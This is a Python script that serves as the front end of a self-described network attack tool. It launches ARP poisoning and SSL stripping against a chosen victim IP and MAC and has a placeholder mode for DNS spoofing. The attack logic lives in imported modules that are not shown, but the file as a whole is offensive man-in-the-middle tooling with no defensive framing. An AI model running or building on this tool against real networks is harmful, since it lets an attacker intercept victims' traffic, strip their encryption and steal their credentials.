import argparse
import sys
import os
from arp_poisoning import ARP_Poisoning
from ssl_stripping import SSLStripper  # <== ADDED
import scapy.all as scapy

def get_network_info():
    """Get basic network information"""
    try:
        # Get default interface
        default_iface = scapy.conf.iface
        
        # Get local IP and MAC
        local_ip = scapy.get_if_addr(default_iface)
        local_mac = scapy.get_if_hwaddr(default_iface)
        
        return default_iface, local_ip, local_mac
    except Exception as e:
        print(f"Error getting network info: {e}")
        return None, None, None

def validate_mac(mac):
    """Validate MAC address format"""
    import re
    mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return re.match(mac_pattern, mac) is not None

def validate_ip(ip):
    """Validate IP address format"""
    import re
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(ip_pattern, ip):
        return False
    # Check each octet is 0-255
    octets = ip.split('.')
    return all(0 <= int(octet) <= 255 for octet in octets)

def run_arp_poisoning(args):
    """Execute ARP poisoning attack"""
    print(f"[+] Starting ARP Poisoning Attack")
    print(f"    Target: {args.victim_ip} ({args.victim_mac})")
    print(f"    Spoofing: {args.ip_to_spoof}")
    print(f"    Interface: {args.interface}")
    print(f"    Interval: {args.interval}s")
    print("[!] Press Ctrl+C to stop")
    
    arp_attack = ARP_Poisoning(
        iface=args.interface,
        packet_interval=args.interval,
        victim_mac=args.victim_mac,
        victim_ip=args.victim_ip,
        ip_to_spoof=args.ip_to_spoof,
        attacker_mac=args.attacker_mac,
        attacker_ip=args.attacker_ip
    )
    
    arp_attack.run()

def run_dns_spoofing(args):
    """Execute DNS spoofing attack (placeholder)"""
    print("[!] DNS Spoofing not implemented yet")
    sys.exit(1)

def run_ssl_stripping(args):
    """Execute SSL stripping attack"""
    print(f"[+] Launching SSL Stripping")
    print(f"    Victim IP: {args.target}")
    print(f"    Redirecting to: {args.redirect}")
    
    default_iface, local_ip, _ = get_network_info()
    ssl_stripper = SSLStripper(
        interface=args.interface or default_iface,
        ip_victim=args.target,
        ip_attacker=local_ip,
        
    )
    ssl_stripper.strip()

def main():
    # Get network information
    default_iface, local_ip, local_mac = get_network_info()
    
    parser = argparse.ArgumentParser(
        description='Network Attack Tool - ARP Poisoning, DNS Spoofing, SSL Stripping',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    
    subparsers = parser.add_subparsers(dest='mode', help='Attack mode')
    subparsers.required = True
    
    # ARP Poisoning parser
    arp_parser = subparsers.add_parser('arp', help='ARP Poisoning attack')
    arp_parser.add_argument('--victim-ip', required=True, help='Target victim IP address')
    arp_parser.add_argument('--victim-mac', required=True, help='Target victim MAC address')
    arp_parser.add_argument('--ip-to-spoof', required=True, help='IP address to spoof')
    arp_parser.add_argument('--interface', default=default_iface, help=f'Network interface (default: {default_iface})')
    arp_parser.add_argument('--interval', type=float, default=2.0, help='Spoofed packet repetition interval in seconds (default: 2.0)')
    arp_parser.add_argument('--attacker-ip', default=local_ip, help=f'Attacker IP address (default: {local_ip})')
    arp_parser.add_argument('--attacker-mac', default=local_mac, help=f'Attacker MAC address (default: {local_mac})')
    
    # DNS Spoofing parser (placeholder for now)
    dns_parser = subparsers.add_parser('dns', help='DNS Spoofing attack (not implemented)')
    dns_parser.add_argument('--target', required=True, help='Target IP address')
    dns_parser.add_argument('--domain', required=True, help='Domain to spoof')
    dns_parser.add_argument('--redirect', required=True, help='IP to redirect to')
    
    # SSL Stripping parser (fully implemented)
    ssl_parser = subparsers.add_parser('ssl', help='SSL Stripping attack')
    ssl_parser.add_argument('--target', required=True, help='Target IP address')
    ssl_parser.add_argument('--redirect', required=False, help='Redirect HTTP site (e.g., example.com)')
    ssl_parser.add_argument('--interface', default=default_iface, help=f'Network interface (default: {default_iface})')
    
    args = parser.parse_args()
    
    if not default_iface or not local_ip or not local_mac:
        print("[!] Error: Could not obtain network information")
        sys.exit(1)
    
    if args.mode == 'arp':
        if not validate_ip(args.victim_ip):
            print(f"[!] Error: Invalid victim IP address: {args.victim_ip}")
            sys.exit(1)
        if not validate_mac(args.victim_mac):
            print(f"[!] Error: Invalid victim MAC address: {args.victim_mac}")
            sys.exit(1)
        if not validate_ip(args.ip_to_spoof):
            print(f"[!] Error: Invalid spoof IP address: {args.ip_to_spoof}")
            sys.exit(1)
        if args.interval <= 0:
            print(f"[!] Error: Interval must be positive: {args.interval}")
            sys.exit(1)
        if not os.path.exists('arp_poisoning.py'):
            print("[!] Error: arp_poisoning.py not found")
            sys.exit(1)
        run_arp_poisoning(args)
    
    elif args.mode == 'dns':
        run_dns_spoofing(args)
    
    elif args.mode == 'ssl':
        if not validate_ip(args.target):
            print(f"[!] Error: Invalid target IP address: {args.target}")
            sys.exit(1)
        run_ssl_stripping(args)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
